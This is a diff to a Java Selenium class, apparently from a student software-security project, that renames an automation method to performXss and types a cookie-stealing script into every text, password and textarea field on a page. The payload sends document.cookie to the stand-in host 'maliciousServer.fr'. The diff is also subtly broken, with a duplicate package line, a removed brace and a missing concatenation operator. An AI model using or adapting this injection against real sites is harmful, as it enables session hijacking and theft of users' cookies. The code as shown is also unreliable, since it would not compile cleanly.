@@ -1,4 +1,5 @@
 package fr.isep.projetseculogiciel;
+package com.example.demo;
 // package com.example.demo;
 
 import org.openqa.selenium.By;
@@ -15,7 +16,7 @@ public class F3Controller {
 
     public F3Controller(String url) {
     // Set the path to your ChromeDriver executable
-    System.setProperty("webdriver.chrome.driver", "C:/Users/maxime/Downloads/chromedriver-win64/chromedriver-win64/chromedriver.exe");
+    System.setProperty("webdriver.chrome.driver", "C:/Users/marcn/Downloads/chromedriver-win64/chromedriver-win64/chromedriver.exe");
 
     // Optional: Set Chrome options (e.g., headless mode)
     ChromeOptions options = new ChromeOptions();
@@ -32,18 +33,20 @@ public class F3Controller {
     }
 }
 
-public void performWebAutomation() {
+public void performXss() {
     try {
         // Find all text input elements on the page
         List<WebElement> textInputs = driver.findElements(By.cssSelector("input[type='text'], input[type='password'], textarea"));
         System.out.println(textInputs);
         Thread.sleep(1000);
 
+        String enpointUrl = "https://www.maliciousServer.fr";
+
         // Iterate through each text input element and set a special text
         for (WebElement input : textInputs) {
 
             // TODO : SEND THE COOKIE IN AN EXTRNAL ENDPOINT URL
-            input.sendKeys("<script>document.cookie</script>");
+            input.sendKeys("<script>document.write('<img src=" + enpointUrl + "?cookie=' document.cookie+' />');</script>");
             Thread.sleep(1000);
         }
 
@@ -62,5 +65,4 @@ public void performWebAutomation() {
 }
 
 
-}
 }
